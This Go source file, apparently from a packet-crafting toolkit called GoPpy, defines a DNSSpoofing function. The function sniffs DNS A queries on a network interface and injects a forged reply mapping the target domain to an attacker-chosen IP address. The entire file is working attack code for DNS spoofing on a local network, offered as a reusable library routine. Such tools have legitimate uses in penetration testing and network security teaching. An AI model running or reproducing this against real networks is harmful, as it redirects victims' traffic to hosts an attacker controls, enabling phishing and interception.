package higherlevel

import (
	"fmt"
	"github.com/google/gopacket/layers"
	craft "github.com/tiagomdiogo/GoPpy/packet"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	"log"
)

// DNSSpoofing todo get IP of the interface
func DNSSpoofing(srcIP, dstIP, srcPort, dstPort, iface, queryDomain, answerIP string) error {
	// Open a live packet capture
	SuperS, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		return fmt.Errorf("Failed to initialize SuperSocket: %v", err)
	}
	defer SuperS.Close()

	for {
		// Receive a packet
		packet, err := SuperS.Recv()
		if err != nil {
			return fmt.Errorf("Failed to receive packet: %v", err)
		}

		dnsLayer := packet.Layer(layers.LayerTypeDNS)
		if dnsLayer == nil {
			continue
		}

		dns, _ := dnsLayer.(*layers.DNS)

		// Check if it's a DNS query for the domain we are spoofing
		for _, q := range dns.Questions {
			if string(q.Name) == queryDomain && q.Type == layers.DNSTypeA && q.Class == layers.DNSClassIN {
				log.Printf("Spoofing DNS response for domain %s\n", queryDomain)

				// Craft IP Layer
				ipLayer := craft.IPv4Layer()
				ipLayer.SetSrcIP(srcIP)
				ipLayer.SetDstIP(dstIP)

				// Craft UDP layer
				udpLayer := craft.UDPLayer()
				udpLayer.SetSrcPort(srcPort)
				udpLayer.SetDstPort(dstPort)

				//Craft DNS Layer
				dnsLayer := craft.DNSLayer()
				dnsLayer.AddAnswer(queryDomain, answerIP)

				// Craft the packet
				dnsResponse, err := craft.CraftPacket(ipLayer.Layer(), udpLayer.Layer(), dnsLayer.Layer())
				if err != nil {
					return err
				}

				// Send the spoofed response
				err = SuperS.Send(dnsResponse)
				if err != nil {
					return fmt.Errorf("Failed to send packet: %v", err)
				}

				return nil
			}
		}
	}
}
